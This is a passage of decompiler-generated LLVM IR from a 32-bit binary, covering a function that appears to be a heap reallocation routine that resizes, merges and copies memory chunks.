  br label %dec_label_pc_8053707

dec_label_pc_805340e:                             ; preds = %dec_label_pc_80533ec
  %v1_805340e = icmp eq i32 %tmp7, 0
  %v1_8053410 = icmp eq i1 %v1_805340e, false
  br i1 %v1_8053410, label %dec_label_pc_8053423, label %dec_label_pc_8053412

dec_label_pc_8053412:                             ; preds = %dec_label_pc_805340e
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053419 = call i32 @function_8053949(i32 %tmp6)
  store i32 %v1_8053419, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053707

dec_label_pc_8053423:                             ; preds = %dec_label_pc_805340e
  %v2_805342e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805342e, i32* @eax, align 4
  store i32 %v2_805342e, i32* %stack_var_-60, align 4
  %v2_8053433 = call i32 @function_80540b0(i32 %v2_805342e, i32 134561965)
  store i32 %v2_8053433, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056820.205 to i32), i32* %stack_var_-60, align 4
  %v1_805343f = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056820.205 to i32))
  store i32 %v1_805343f, i32* %eax.global-to-local, align 4
  %v0_8053447 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8053447, -32
  br i1 %tmp19, label %dec_label_pc_805345e, label %dec_label_pc_805344c

dec_label_pc_805344c:                             ; preds = %dec_label_pc_8053423
  %v0_805344c = load i32, i32* %stack_var_-60, align 4
  %v1_805344c = call i32 @function_8052729(i32 %v0_805344c)
  store i32 %v1_805344c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053453 = inttoptr i32 %v1_805344c to i32*
  store i32 12, i32* %v1_8053453, align 4
  br label %dec_label_pc_805370a

dec_label_pc_805345e:                             ; preds = %dec_label_pc_8053423
  %v1_805345e = add i32 %v0_8053447, 11
  %tmp20 = icmp ult i32 %v1_805345e, 16
  br i1 %tmp20, label %dec_label_pc_8053475, label %dec_label_pc_805346e

dec_label_pc_805346e:                             ; preds = %dec_label_pc_805345e
  %v1_805346e = and i32 %v1_805345e, -8
  br label %dec_label_pc_8053475

dec_label_pc_8053475:                             ; preds = %dec_label_pc_805345e, %dec_label_pc_805346e
  %stack_var_-40.0 = phi i32 [ %v1_805346e, %dec_label_pc_805346e ], [ 16, %dec_label_pc_805345e ]
  %storemerge26 = phi i32 [ %v1_805346e, %dec_label_pc_805346e ], [ %v1_805345e, %dec_label_pc_805345e ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8053479 = add i32 %tmp6, -8
  store i32 %v1_8053479, i32* @edi, align 4
  %v1_805347c = add i32 %tmp6, -4
  %v2_805347c = inttoptr i32 %v1_805347c to i32*
  %v3_805347c = load i32, i32* %v2_805347c, align 4
  store i32 %v3_805347c, i32* @edx, align 4
  %v1_8053481 = and i32 %v3_805347c, -4
  store i32 %v1_8053481, i32* %eax.global-to-local, align 4
  %v2_8053488 = and i32 %v3_805347c, 2
  %v3_8053488 = icmp eq i32 %v2_8053488, 0
  %v1_805348b = icmp eq i1 %v3_8053488, false
  br i1 %v1_805348b, label %dec_label_pc_8053625, label %dec_label_pc_8053491

dec_label_pc_8053491:                             ; preds = %dec_label_pc_8053475
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053481, i32* @ebx, align 4
  %v7_8053497 = icmp ult i32 %v1_8053481, %stack_var_-40.0
  %v1_8053499 = icmp eq i1 %v7_8053497, false
  br i1 %v1_8053499, label %dec_label_pc_80535d0, label %dec_label_pc_805349f

dec_label_pc_805349f:                             ; preds = %dec_label_pc_8053491
  %v2_805349f = add i32 %v1_8053481, %v1_8053479
  store i32 %v2_805349f, i32* @esi, align 4
  %v1_80534a2 = load i32, i32* @global_var_8056bec.207, align 4
  %v12_80534a2 = icmp eq i32 %v2_805349f, %v1_80534a2
  %v1_80534a8 = icmp eq i1 %v12_80534a2, false
  %v1_80534e2 = add i32 %v2_805349f, 4
  %v2_80534e2 = inttoptr i32 %v1_80534e2 to i32*
  %v3_80534e2 = load i32, i32* %v2_80534e2, align 4
  br i1 %v1_80534a8, label %dec_label_pc_80534e2, label %dec_label_pc_80534aa

dec_label_pc_80534aa:                             ; preds = %dec_label_pc_805349f
  %v1_80534af = and i32 %v3_80534e2, -4
  %v2_80534b2 = add i32 %v1_80534af, %v1_8053481
  store i32 %v2_80534b2, i32* %ecx.global-to-local, align 4
  %v1_80534b8 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80534b8, i32* %eax.global-to-local, align 4
  %v7_80534bb = icmp ult i32 %v2_80534b2, %v1_80534b8
  br i1 %v7_80534bb, label %dec_label_pc_8053520, label %dec_label_pc_80534bf

dec_label_pc_80534bf:                             ; preds = %dec_label_pc_80534aa
  %v1_80534bf = urem i32 %v3_805347c, 2
  %v5_80534c2 = or i32 %v1_80534bf, %stack_var_-40.0
  store i32 %v5_80534c2, i32* @edx, align 4
  store i32 %v5_80534c2, i32* %v2_805347c, align 4
  %v0_80534cd = load i32, i32* %ecx.global-to-local, align 4
  %v2_80534cd = sub i32 %v0_80534cd, %stack_var_-40.0
  %v0_80534cf = load i32, i32* @edi, align 4
  %v2_80534cf = add i32 %v0_80534cf, %stack_var_-40.0
  store i32 %v2_80534cf, i32* %eax.global-to-local, align 4
  %v1_80534d2 = or i32 %v2_80534cd, 1
  store i32 %v1_80534d2, i32* %ecx.global-to-local, align 4
  store i32 %v2_80534cf, i32* @global_var_8056bec.207, align 4
  %v2_80534da = add i32 %v2_80534cf, 4
  %v3_80534da = inttoptr i32 %v2_80534da to i32*
  store i32 %v1_80534d2, i32* %v3_80534da, align 4
  br label %dec_label_pc_80536f5

dec_label_pc_80534e2:                             ; preds = %dec_label_pc_805349f
  %v1_80534e7 = and i32 %v3_80534e2, -2
  store i32 %v1_80534e7, i32* %eax.global-to-local, align 4
  %v3_80534ea = add i32 %v1_80534e2, %v1_80534e7
  %v4_80534ea = inttoptr i32 %v3_80534ea to i8*
  %v5_80534ea = load i8, i8* %v4_80534ea, align 1
  %v6_80534ea = urem i8 %v5_80534ea, 2
  %v7_80534ea = icmp eq i8 %v6_80534ea, 0
  %v1_80534ef = icmp eq i1 %v7_80534ea, false
  br i1 %v1_80534ef, label %dec_label_pc_8053520, label %dec_label_pc_80534f1

dec_label_pc_80534f1:                             ; preds = %dec_label_pc_80534e2
  %v1_80534f1 = and i32 %v3_80534e2, -4
  %v2_80534f8 = add i32 %v1_80534f1, %v1_8053481
  store i32 %v2_80534f8, i32* @ebx, align 4
  %v10_80534fa = icmp ult i32 %v2_80534f8, %stack_var_-40.0
  br i1 %v10_80534fa, label %dec_label_pc_8053520, label %dec_label_pc_8053500

dec_label_pc_8053500:                             ; preds = %dec_label_pc_80534f1
  %v1_8053500 = add i32 %v1_8053481, %tmp6
  %v2_8053500 = inttoptr i32 %v1_8053500 to i32*
  %v3_8053500 = load i32, i32* %v2_8053500, align 4
  store i32 %v3_8053500, i32* @edx, align 4
  %v1_8053503 = add i32 %v2_805349f, 12
  %v2_8053503 = inttoptr i32 %v1_8053503 to i32*
  %v3_8053503 = load i32, i32* %v2_8053503, align 4
  store i32 %v3_8053503, i32* %eax.global-to-local, align 4
  %v1_8053506 = add i32 %v3_8053500, 12
  %v2_8053506 = inttoptr i32 %v1_8053506 to i32*
  %v3_8053506 = load i32, i32* %v2_8053506, align 4
  %v15_8053506 = icmp eq i32 %v3_8053506, %v2_805349f
  %v1_8053509 = icmp eq i1 %v15_8053506, false
  br i1 %v1_8053509, label %dec_label_pc_8053510, label %dec_label_pc_805350b

dec_label_pc_805350b:                             ; preds = %dec_label_pc_8053500
  %v1_805350b = add i32 %v3_8053503, 8
  %v2_805350b = inttoptr i32 %v1_805350b to i32*
  %v3_805350b = load i32, i32* %v2_805350b, align 4
  %v15_805350b = icmp eq i32 %v3_805350b, %v2_805349f
  br i1 %v15_805350b, label %dec_label_pc_8053515, label %dec_label_pc_8053510

dec_label_pc_8053510:                             ; preds = %dec_label_pc_805350b, %dec_label_pc_8053500
  %v0_8053510 = call i32 @function_8053ae5()
  store i32 %v0_8053510, i32* %eax.global-to-local, align 4
  %v1_8053515.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053515

dec_label_pc_8053515:                             ; preds = %dec_label_pc_805350b, %dec_label_pc_8053510
  %v1_8053515 = phi i32 [ %v3_8053500, %dec_label_pc_805350b ], [ %v1_8053515.pre, %dec_label_pc_8053510 ]
  %v0_8053515 = phi i32 [ %v3_8053503, %dec_label_pc_805350b ], [ %v0_8053510, %dec_label_pc_8053510 ]
  %v2_8053515 = add i32 %v1_8053515, 12
  %v3_8053515 = inttoptr i32 %v2_8053515 to i32*
  store i32 %v0_8053515, i32* %v3_8053515, align 4
  %v0_8053518 = load i32, i32* @edx, align 4
  %v1_8053518 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053518 = add i32 %v1_8053518, 8
  %v3_8053518 = inttoptr i32 %v2_8053518 to i32*
  store i32 %v0_8053518, i32* %v3_8053518, align 4
  %v0_80535d0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80535d0

dec_label_pc_8053520:                             ; preds = %dec_label_pc_80534f1, %dec_label_pc_80534e2, %dec_label_pc_80534aa
  %v1_8053527 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053527, i32* %eax.global-to-local, align 4
  store i32 %v1_8053527, i32* %stack_var_-60, align 4
  %v1_805352b = call i32 @function_8052b84(i32 %v1_8053527)
  store i32 %v1_805352b, i32* %eax.global-to-local, align 4
  store i32 %v1_805352b, i32* @edx, align 4
  %v1_8053535 = icmp eq i32 %v1_805352b, 0
  br i1 %v1_8053535, label %dec_label_pc_80536f1, label %dec_label_pc_805353d

dec_label_pc_805353d:                             ; preds = %dec_label_pc_8053520
  %v1_805353d = add i32 %v1_805352b, -8
  store i32 %v1_805353d, i32* %ebx.global-to-local, align 4
  %v1_8053540 = load i32, i32* @esi, align 4
  %v12_8053540 = icmp eq i32 %v1_805353d, %v1_8053540
  %v1_8053542 = add i32 %v1_805352b, -4
  %v2_8053542 = inttoptr i32 %v1_8053542 to i32*
  %v3_8053542 = load i32, i32* %v2_8053542, align 4
  store i32 %v3_8053542, i32* %eax.global-to-local, align 4
  %v1_8053545 = icmp eq i1 %v12_8053540, false
  br i1 %v1_8053545, label %dec_label_pc_8053553, label %dec_label_pc_8053547

dec_label_pc_8053547:                             ; preds = %dec_label_pc_805353d
  %v1_8053547 = and i32 %v3_8053542, -4
  store i32 %v1_8053547, i32* %eax.global-to-local, align 4
  store i32 %v1_8053481, i32* @edx, align 4
  %v2_805354e = add i32 %v1_8053547, %v1_8053481
  store i32 %v2_805354e, i32* @ebx, align 4
  br label %dec_label_pc_80535d0

dec_label_pc_8053553:                             ; preds = %dec_label_pc_805353d
  %v1_8053557 = add i32 %v1_8053481, -4
  store i32 %v1_8053557, i32* %eax.global-to-local, align 4
  %v2_805355c = udiv i32 %v1_8053557, 4
  store i32 %v2_805355c, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8053557, 37
  br i1 %tmp, label %dec_label_pc_8053575, label %dec_label_pc_8053564

dec_label_pc_8053564:                             ; preds = %dec_label_pc_8053553
  store i32 %v1_805352b, i32* %stack_var_-60, align 4
  %v3_805356b = inttoptr i32 %v1_805352b to i16*
  %v4_805356b = call i32 @function_8054972(i16* %v3_805356b, i32 %tmp6, i32 %v1_8053557)
  store i32 %v4_805356b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535bc

dec_label_pc_8053575:                             ; preds = %dec_label_pc_8053553
  store i32 %tmp6, i32* @esi, align 4
  %v1_805357c = inttoptr i32 %tmp6 to i32*
  %v2_805357c = load i32, i32* %v1_805357c, align 4
  store i32 %v2_805357c, i32* %eax.global-to-local, align 4
  %v2_805357e = inttoptr i32 %v1_805352b to i32*
  store i32 %v2_805357c, i32* %v2_805357e, align 4
  %v0_8053580 = load i32, i32* @esi, align 4
  %v1_8053580 = add i32 %v0_8053580, 4
  %v2_8053580 = inttoptr i32 %v1_8053580 to i32*
  %v3_8053580 = load i32, i32* %v2_8053580, align 4
  store i32 %v3_8053580, i32* %eax.global-to-local, align 4
  %v1_8053583 = load i32, i32* @edx, align 4
  %v2_8053583 = add i32 %v1_8053583, 4
  %v3_8053583 = inttoptr i32 %v2_8053583 to i32*
  store i32 %v3_8053580, i32* %v3_8053583, align 4
  %v0_8053586 = load i32, i32* @esi, align 4
  %v1_8053586 = add i32 %v0_8053586, 8
  %v2_8053586 = inttoptr i32 %v1_8053586 to i32*
  %v3_8053586 = load i32, i32* %v2_8053586, align 4
  store i32 %v3_8053586, i32* %eax.global-to-local, align 4
  %v1_8053589 = load i32, i32* @edx, align 4
  %v2_8053589 = add i32 %v1_8053589, 8
  %v3_8053589 = inttoptr i32 %v2_8053589 to i32*
  store i32 %v3_8053586, i32* %v3_8053589, align 4
  %tmp27 = icmp ult i32 %v1_8053557, 17
  br i1 %tmp27, label %dec_label_pc_80535bc, label %dec_label_pc_805358e

dec_label_pc_805358e:                             ; preds = %dec_label_pc_8053575
  %v0_805358e = load i32, i32* @esi, align 4
  %v1_805358e = add i32 %v0_805358e, 12
  %v2_805358e = inttoptr i32 %v1_805358e to i32*
  %v3_805358e = load i32, i32* %v2_805358e, align 4
  store i32 %v3_805358e, i32* %eax.global-to-local, align 4
  %v0_8053591 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053594 = load i32, i32* @edx, align 4
  %v2_8053594 = add i32 %v1_8053594, 12
  %v3_8053594 = inttoptr i32 %v2_8053594 to i32*
  store i32 %v3_805358e, i32* %v3_8053594, align 4
  %v0_8053597 = load i32, i32* @esi, align 4
  %v1_8053597 = add i32 %v0_8053597, 16
  %v2_8053597 = inttoptr i32 %v1_8053597 to i32*
  %v3_8053597 = load i32, i32* %v2_8053597, align 4
  store i32 %v3_8053597, i32* %eax.global-to-local, align 4
  %v1_805359a = load i32, i32* @edx, align 4
  %v2_805359a = add i32 %v1_805359a, 16
  %v3_805359a = inttoptr i32 %v2_805359a to i32*
  store i32 %v3_8053597, i32* %v3_805359a, align 4
  %tmp21 = icmp ult i32 %v0_8053591, 7
  br i1 %tmp21, label %dec_label_pc_80535bc, label %dec_label_pc_805359f

dec_label_pc_805359f:                             ; preds = %dec_label_pc_805358e
  %v0_805359f = load i32, i32* @esi, align 4
  %v1_805359f = add i32 %v0_805359f, 20
  %v2_805359f = inttoptr i32 %v1_805359f to i32*
  %v3_805359f = load i32, i32* %v2_805359f, align 4
  store i32 %v3_805359f, i32* %eax.global-to-local, align 4
  %v0_80535a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535a5 = load i32, i32* @edx, align 4
  %v2_80535a5 = add i32 %v1_80535a5, 20
  %v3_80535a5 = inttoptr i32 %v2_80535a5 to i32*
  store i32 %v3_805359f, i32* %v3_80535a5, align 4
  %v0_80535a8 = load i32, i32* @esi, align 4
  %v1_80535a8 = add i32 %v0_80535a8, 24
  %v2_80535a8 = inttoptr i32 %v1_80535a8 to i32*
  %v3_80535a8 = load i32, i32* %v2_80535a8, align 4
  store i32 %v3_80535a8, i32* %eax.global-to-local, align 4
  %v1_80535ab = load i32, i32* @edx, align 4
  %v2_80535ab = add i32 %v1_80535ab, 24
  %v3_80535ab = inttoptr i32 %v2_80535ab to i32*
  store i32 %v3_80535a8, i32* %v3_80535ab, align 4
  %tmp22 = icmp ult i32 %v0_80535a2, 9
  br i1 %tmp22, label %dec_label_pc_80535bc, label %dec_label_pc_80535b0

dec_label_pc_80535b0:                             ; preds = %dec_label_pc_805359f
  %v0_80535b0 = load i32, i32* @esi, align 4
  %v1_80535b0 = add i32 %v0_80535b0, 28
  %v2_80535b0 = inttoptr i32 %v1_80535b0 to i32*
  %v3_80535b0 = load i32, i32* %v2_80535b0, align 4
  store i32 %v3_80535b0, i32* %eax.global-to-local, align 4
  %v1_80535b3 = load i32, i32* @edx, align 4
  %v2_80535b3 = add i32 %v1_80535b3, 28
  %v3_80535b3 = inttoptr i32 %v2_80535b3 to i32*
  store i32 %v3_80535b0, i32* %v3_80535b3, align 4
  %v0_80535b6 = load i32, i32* @esi, align 4
  %v1_80535b6 = add i32 %v0_80535b6, 32
  %v2_80535b6 = inttoptr i32 %v1_80535b6 to i32*
  %v3_80535b6 = load i32, i32* %v2_80535b6, align 4
  store i32 %v3_80535b6, i32* %eax.global-to-local, align 4
  %v1_80535b9 = load i32, i32* @edx, align 4
  %v2_80535b9 = add i32 %v1_80535b9, 32
  %v3_80535b9 = inttoptr i32 %v2_80535b9 to i32*
  store i32 %v3_80535b6, i32* %v3_80535b9, align 4
  br label %dec_label_pc_80535bc

dec_label_pc_80535bc:                             ; preds = %dec_label_pc_805359f, %dec_label_pc_805358e, %dec_label_pc_8053575, %dec_label_pc_8053564, %dec_label_pc_80535b0
  %v0_80535bf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80535bf = add i32 %v0_80535bf, 8
  store i32 %v1_80535bf, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80535c6 = call i32 @function_8053949(i32 %tmp6)
  br label %dec_label_pc_80536ec

dec_label_pc_80535d0:                             ; preds = %dec_label_pc_8053491, %dec_label_pc_8053547, %dec_label_pc_8053515
  %v1_80535e1 = phi i32 [ %v1_8053481, %dec_label_pc_8053491 ], [ %v2_805354e, %dec_label_pc_8053547 ], [ %v0_80535d0.pre, %dec_label_pc_8053515 ]
  %v5_80535d2 = sub i32 %v1_80535e1, %stack_var_-40.0
  store i32 %v5_80535d2, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_80535d2, 16
  br i1 %tmp23, label %dec_label_pc_80535db, label %dec_label_pc_80535ed

dec_label_pc_80535db:                             ; preds = %dec_label_pc_80535d0
  %v0_80535db = load i32, i32* @edi, align 4
  %v1_80535db = add i32 %v0_80535db, 4
  %v2_80535db = inttoptr i32 %v1_80535db to i32*
  %v3_80535db = load i32, i32* %v2_80535db, align 4
  %v1_80535de = urem i32 %v3_80535db, 2
  %v2_80535e1 = or i32 %v1_80535de, %v1_80535e1
  store i32 %v2_80535e1, i32* %eax.global-to-local, align 4
  store i32 %v2_80535e1, i32* %v2_80535db, align 4
  %v0_80535e6 = load i32, i32* @edi, align 4
  %v1_80535e6 = load i32, i32* @ebx, align 4
  %v2_80535e6 = add i32 %v0_80535e6, 4
  %v3_80535e6 = add i32 %v2_80535e6, %v1_80535e6
  %v4_80535e6 = inttoptr i32 %v3_80535e6 to i32*
  %v5_80535e6 = load i32, i32* %v4_80535e6, align 4
  %v6_80535e6 = or i32 %v5_80535e6, 1
  store i32 %v6_80535e6, i32* %v4_80535e6, align 4
  br label %dec_label_pc_805361d

dec_label_pc_80535ed:                             ; preds = %dec_label_pc_80535d0
  %v0_80535f1 = load i32, i32* @edi, align 4
  %v2_80535f1 = add i32 %v0_80535f1, %stack_var_-40.0
  store i32 %v2_80535f1, i32* %eax.global-to-local, align 4
  %v1_80535f4 = add i32 %v0_80535f1, 4
  %v2_80535f4 = inttoptr i32 %v1_80535f4 to i32*
  %v3_80535f4 = load i32, i32* %v2_80535f4, align 4
  %v1_80535f7 = urem i32 %v3_80535f4, 2
  %v5_80535fa = or i32 %v1_80535f7, %stack_var_-40.0
  store i32 %v5_80535fa, i32* %v2_80535f4, align 4
  %v0_8053604 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053606 = or i32 %v0_8053604, 1
  store i32 %v1_8053606, i32* @edx, align 4
  %v1_8053609 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053609 = add i32 %v1_8053609, 4
  %v3_8053609 = inttoptr i32 %v2_8053609 to i32*
  store i32 %v1_8053606, i32* %v3_8053609, align 4
  %v0_805360c = load i32, i32* %eax.global-to-local, align 4
  %v1_805360c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805360c = add i32 %v0_805360c, 4
  %v3_805360c = add i32 %v2_805360c, %v1_805360c
  %v4_805360c = inttoptr i32 %v3_805360c to i32*
  %v5_805360c = load i32, i32* %v4_805360c, align 4
  %v6_805360c = or i32 %v5_805360c, 1
  store i32 %v6_805360c, i32* %v4_805360c, align 4
  %v0_8053611 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053611 = add i32 %v0_8053611, 8
  store i32 %v1_8053611, i32* %eax.global-to-local, align 4
  store i32 %v1_8053611, i32* %stack_var_-60, align 4
  %v1_8053615 = call i32 @function_8053949(i32 %v1_8053611)
  store i32 %v1_8053615, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805361d

dec_label_pc_805361d:                             ; preds = %dec_label_pc_80535db, %dec_label_pc_80535ed
  %v0_805361d = load i32, i32* @edi, align 4
  %v1_805361d = add i32 %v0_805361d, 8
  store i32 %v1_805361d, i32* @ebx, align 4
  br label %dec_label_pc_80536f9

dec_label_pc_8053625:                             ; preds = %dec_label_pc_8053475
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8053629 = load i32, i32* @global_var_8056f1c.212, align 4
  %v1_805362e = add i32 %v0_8053629, -1
  store i32 %v1_805362e, i32* %eax.global-to-local, align 4
  %v2_8053633 = inttoptr i32 %v1_8053479 to i32*
  %v3_8053633 = load i32, i32* %v2_8053633, align 4
  store i32 %v3_8053633, i32* @ebp, align 4
  %v1_8053636 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053636, i32* %stack_var_-44, align 4
  %v2_805363c = add i32 %v3_8053633, %v1_805362e
  store i32 %v2_805363c, i32* @edx, align 4
  %v1_805363f = sub i32 0, %v0_8053629
  store i32 %v1_805363f, i32* %eax.global-to-local, align 4
  %v2_8053641 = add i32 %v2_805363c, %v1_8053636
  %v2_8053644 = and i32 %v2_8053641, %v1_805363f
  store i32 %v2_8053644, i32* @esi, align 4
  %v2_8053648 = sub i32 %v2_8053644, %v3_8053633
  store i32 %v2_8053648, i32* @ebx, align 4
  %v15_805364a = icmp eq i32 %v1_8053481, %v2_8053648
  br i1 %v15_805364a, label %dec_label_pc_80536f5, label %dec_label_pc_8053654

dec_label_pc_8053654:                             ; preds = %dec_label_pc_8053625
  %v2_805365b = sub i32 %v1_8053479, %v3_8053633
  store i32 %v2_805365b, i32* @edi, align 4
  %v2_805365d = add i32 %v3_8053633, %v1_8053481
  store i32 %v2_805365d, i32* %eax.global-to-local, align 4
  store i32 %v2_805365b, i32* %stack_var_-60, align 4
  %v6_8053661 = inttoptr i32 %v2_805365b to i32*
  %v7_8053661 = call i32 @function_80547d6(i32* %v6_8053661, i32 %v2_805365d, i32 %v2_8053644, i32 1, i32 %v1_8053636, i32 %v1_8053481)
  store i32 %v7_8053661, i32* %eax.global-to-local, align 4
  %v10_8053669 = icmp eq i32 %v7_8053661, -1
  br i1 %v10_8053669, label %dec_label_pc_80536ad, label %dec_label_pc_805366e

dec_label_pc_805366e:                             ; preds = %dec_label_pc_8053654
  %v1_805366e = load i32, i32* @ebp, align 4
  %v2_805366e = add i32 %v1_805366e, %v7_8053661
  store i32 %v2_805366e, i32* @edx, align 4
  %v0_8053671 = load i32, i32* @ebx, align 4
  %v1_8053671 = or i32 %v0_8053671, 2
  store i32 %v1_8053671, i32* %ebx.global-to-local, align 4
  %v0_8053674 = load i32, i32* @esi, align 4
  store i32 %v0_8053674, i32* %eax.global-to-local, align 4
  %v2_8053676 = add i32 %v2_805366e, 4
  %v3_8053676 = inttoptr i32 %v2_8053676 to i32*
  store i32 %v1_8053671, i32* %v3_8053676, align 4
  %v0_8053679 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053679 = sub i32 %v0_8053679, %v1_8053481
  %v1_805367d = load i32, i32* @global_var_8056f24.217, align 4
  %v2_805367d = add i32 %v1_805367d, %v5_8053679
  store i32 %v2_805367d, i32* %eax.global-to-local, align 4
  store i32 %v2_805367d, i32* @global_var_8056f24.217, align 4
  %v1_8053688 = load i32, i32* @global_var_8056f30.218, align 16
  %tmp24 = icmp ugt i32 %v2_805367d, %v1_8053688
  br i1 %tmp24, label %dec_label_pc_8053690, label %dec_label_pc_8053695

dec_label_pc_8053690:                             ; preds = %dec_label_pc_805366e
  store i32 %v2_805367d, i32* @global_var_8056f30.218, align 16
  br label %dec_label_pc_8053695

dec_label_pc_8053695:                             ; preds = %dec_label_pc_805366e, %dec_label_pc_8053690
  %v1_8053695 = load i32, i32* @global_var_8056f28.219, align 8
  %v2_8053695 = add i32 %v1_8053695, %v2_805367d
  store i32 %v2_8053695, i32* %eax.global-to-local, align 4
  %v1_805369b = load i32, i32* @global_var_8056f34.220, align 4
  %tmp25 = icmp ugt i32 %v2_8053695, %v1_805369b
  br i1 %tmp25, label %dec_label_pc_80536a3, label %dec_label_pc_80536a8

dec_label_pc_80536a3:                             ; preds = %dec_label_pc_8053695
  store i32 %v2_8053695, i32* @global_var_8056f34.220, align 4
  br label %dec_label_pc_80536a8

dec_label_pc_80536a8:                             ; preds = %dec_label_pc_8053695, %dec_label_pc_80536a3
  %v0_80536a8 = load i32, i32* @edx, align 4
  %v1_80536a8 = add i32 %v0_80536a8, 8
  store i32 %v1_80536a8, i32* @ebx, align 4
  br label %dec_label_pc_80536f9

dec_label_pc_80536ad:                             ; preds = %dec_label_pc_8053654
  %v2_80536ad = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80536ad, i32* %eax.global-to-local, align 4
  %v10_80536b0 = icmp ult i32 %v1_8053481, %v2_80536ad
  %v1_80536b4 = icmp eq i1 %v10_80536b0, false
  br i1 %v1_80536b4, label %dec_label_pc_80536f5, label %dec_label_pc_80536b6

dec_label_pc_80536b6:                             ; preds = %dec_label_pc_80536ad
  %v1_80536bd = add i32 %stack_var_-40.0, -7
  store i32 %v1_80536bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80536bd, i32* %stack_var_-60, align 4
  %v1_80536c1 = call i32 @function_8052b84(i32 %v1_80536bd)
  store i32 %v1_80536c1, i32* %eax.global-to-local, align 4
  store i32 %v1_80536c1, i32* @ebx, align 4
  %v1_80536cb = icmp eq i32 %v1_80536c1, 0
  br i1 %v1_80536cb, label %dec_label_pc_80536f1, label %dec_label_pc_80536cf

dec_label_pc_80536cf:                             ; preds = %dec_label_pc_80536b6
  %v1_80536d4 = add i32 %v1_8053481, -8
  store i32 %v1_80536d4, i32* %eax.global-to-local, align 4
  store i32 %v1_80536c1, i32* %stack_var_-60, align 4
  %v3_80536dd = inttoptr i32 %v1_80536c1 to i16*
  %v4_80536dd = call i32 @function_8054972(i16* %v3_80536dd, i32 %tmp6, i32 %v1_80536d4)
  store i32 %v4_80536dd, i32* %eax.global-to-local, align 4
  store i32 %v1_80536c1, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80536e7 = call i32 @function_8053949(i32 %tmp6)
  br label %dec_label_pc_80536ec

dec_label_pc_80536ec:                             ; preds = %dec_label_pc_80535bc, %dec_label_pc_80536cf
  %storemerge = phi i32 [ %v1_80536e7, %dec_label_pc_80536cf ], [ %v1_80535c6, %dec_label_pc_80535bc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f9

dec_label_pc_80536f1:                             ; preds = %dec_label_pc_80536b6, %dec_label_pc_8053520
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80536f9

dec_label_pc_80536f5:                             ; preds = %dec_label_pc_80536ad, %dec_label_pc_8053625, %dec_label_pc_80534bf
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_80536f9

dec_label_pc_80536f9:                             ; preds = %dec_label_pc_80536f1, %dec_label_pc_80536ec, %dec_label_pc_80536a8, %dec_label_pc_805361d, %dec_label_pc_80536f5
  store i32 %v2_805342e, i32* @eax, align 4
  store i32 %v2_805342e, i32* %stack_var_-60, align 4
  %v2_8053702 = call i32 @function_80540b0(i32 %v2_805342e, i32 1)
  store i32 %v2_8053702, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053707

dec_label_pc_8053707:                             ; preds = %dec_label_pc_8053412, %dec_label_pc_80533fe, %dec_label_pc_80536f9
  br label %dec_label_pc_805370a

dec_label_pc_805370a:                             ; preds = %dec_label_pc_805344c, %dec_label_pc_8053707
  %v0_805370d = load i32, i32* @ebx, align 4
  store i32 %v0_805370d, i32* %eax.global-to-local, align 4
  store i32 %v0_80533ef, i32* @ebx, align 4
  store i32 %v0_80533ee, i32* @esi, align 4
  store i32 %v0_80533ed, i32* @edi, align 4
  store i32 %v0_80533ec, i32* @ebp, align 4
  ret i32 %v0_805370d

; uselistorder directives
  uselistorder i32 %v1_80536c1, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8053695, { 1, 0, 2 }
  uselistorder i32 %v2_805367d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805365b, { 1, 0, 2 }
  uselistorder i32 %v1_8053636, { 1, 0, 2 }
  uselistorder i32 %v3_8053633, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80535f1, { 1, 0 }
  uselistorder i32 %v1_8053557, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_805352b, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80534cf, { 1, 0, 2 }
  uselistorder i32 %v3_80534e2, { 0, 2, 1 }
  uselistorder i32 %v2_805349f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053481, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053479, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
